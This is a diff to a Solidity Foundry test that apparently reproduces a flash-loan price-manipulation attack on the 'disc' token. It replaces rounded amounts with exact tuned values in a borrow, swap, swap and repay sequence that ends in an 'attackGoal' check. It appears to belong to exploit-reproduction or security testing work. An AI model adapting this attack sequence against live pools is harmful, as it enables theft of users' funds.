@@ -197,13 +197,13 @@ contract DiscoverTest is Test, BlockLoader {
     }
 
     function test_gt() public {
-        borrow_disc(24000e18);
+        borrow_disc(131355932203389845504);
         printBalance("After step0 ");
-        swap_pair_disc_usdt(disc.balanceOf(attacker));
+        swap_pair_disc_usdt(131234087433701998592);
         printBalance("After step1 ");
-        swap_ethpledge_usdt_disc(5000e18);
+        swap_ethpledge_usdt_disc(210105849625173852160);
         printBalance("After step2 ");
-        payback_disc((24000e18 * 1003) / 1000);
+        payback_disc(131750000000000000000);
         printBalance("After step3 ");
         require(attackGoal(), "Attack failed!");
     }
